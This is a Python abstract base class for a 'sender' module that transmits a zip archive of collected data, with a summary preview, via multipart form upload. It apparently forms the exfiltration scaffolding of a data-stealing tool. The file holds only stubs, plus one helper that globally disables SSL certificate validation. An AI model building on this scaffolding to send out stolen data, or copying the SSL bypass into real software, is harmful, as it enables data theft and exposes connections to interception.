import ssl
from io import BytesIO
from abc import abstractmethod
from typing import Tuple, Union

from helper.helpers.config import SenderConfig
from helper.helpers import MultipartFormDataEncoder


class AbstractSender:
    """
    Template for the sender.
    """
    def __init__(self):

        self.__zip_name = None
        self.__data = None
        self.__preview = None

        self._config = SenderConfig()
        self._encoder = MultipartFormDataEncoder()

    @abstractmethod
    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of data.
        """
        ...

    @abstractmethod
    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ...

    @staticmethod
    def _create_unverified_https():
        """
        Disables SSL certificate validation.

        Parameters:
        - None.

        Returns:
        - None.
        """
        ssl._create_default_https_context = ssl._create_unverified_context

    @abstractmethod
    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        ...
